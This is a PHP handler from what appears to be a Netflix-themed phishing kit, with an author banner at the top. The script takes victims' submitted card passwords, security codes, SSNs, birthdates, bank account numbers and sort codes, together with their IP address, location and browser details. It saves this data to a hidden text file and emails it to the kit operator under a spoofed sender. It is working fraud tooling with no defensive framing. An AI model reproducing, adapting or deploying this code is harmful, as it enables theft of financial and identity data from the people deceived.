<?php
/*
___________.____    ._________________________
\_   _____/|    |   |   \__    ___/\_   _____/
 |    __)_ |    |   |   | |    |    |    __)_ 
 |        \|    |___|   | |    |    |        \
/_______  /|_______ \___| |____|   /_______  /
        \/         \/                      \/ ADEMƠ
        ||PRIVATE N|E|T|F|l|I|X 
        ||Bzef Del'☕ ®RESERVED TO: ADEMƠ (kIllUASHk|SHk001)
*/
 if(isset($_POST['thd'])&&isset($_POST['dob_day'])){session_start();
        include '../mine.php';

        $msg.="==============================\r\n";
        $msg.= "|+ CREDITCARD({$_SESSION['ip_countryName']}) OTGxGlow\r\n";
        $msg.= "|+ CREDITCARD US3R : {$_SESSION['fname']}\r\n";
        $msg.= "|+ CARD PASSWOR73D : {$_POST['thd']}\r\n";


   if (isset($_POST['CreditLimit'])) {

        $msg.= "|+ Security Code   : {$_POST['thd']}\r\n";
        $msg.= "|+ Credit Limit    : {$_POST['CreditLimit']}\r\n";
        $msg.= "|+ Customer Number : {$_POST['CustomerNumber']}\r\n";
        }



        $msg.= "|+ CARD BIRTHDATE  : {$_POST['dob_day']}/{$_POST['dob_month']}/{$_POST['dob_year']}\r\n";
        if (isset($_POST['ssn'])) {
                $msg.= "|+ CARD SSN Number : {$_POST['ssn']}\r\n";
        }

        if (isset($_POST['acn'])) {
                $msg.= "|+ ACOUNT NUM. : {$_POST['acn']}\r\n";
                $msg.= "|+ SORT CODE   : {$_POST['scode']}\r\n";
        }


        $msg.="==============================\r\n";
        $msg.= "|+ IP ADDRESS  : {$_SESSION['ip']} ¨ ".now()." GMT\r\n";
        $msg.= "|+ LOCATION    : {$_SESSION['ip_city']} ¨ {$_SESSION['ip_state']} ¨ {$_SESSION['ip_countryName']}\r\n";
        $msg.= "|+ BROWSER     : {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
        $msg.= "|+ USER AGENT  : {$_SERVER['HTTP_USER_AGENT']}\r\n";
        $msg.= "==============================\r\n\r\n\r\n";
        $save = fopen("../../GinTuki_Vbv.txt", "a+");
        fwrite($save, $msg);
        fclose($save);
        $subject = "CREDITCARDvBV({$_SESSION['ip_countryName']}) =?UTF-8?Q?=F0=9F=94=A5_?= {$_SESSION['ip']} |OTGxGlow";
        $headers = "From: OTGxGlow =?utf-8?q?=F0=9F=92=8E?=<CREDITCARDNETFlIX@moneySquad.org>\r\n";
        $headers.= "MIME-Version: 1.0\r\n";
        $headers.= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($yours, $subject, $msg, $headers);
        exit('done');}?>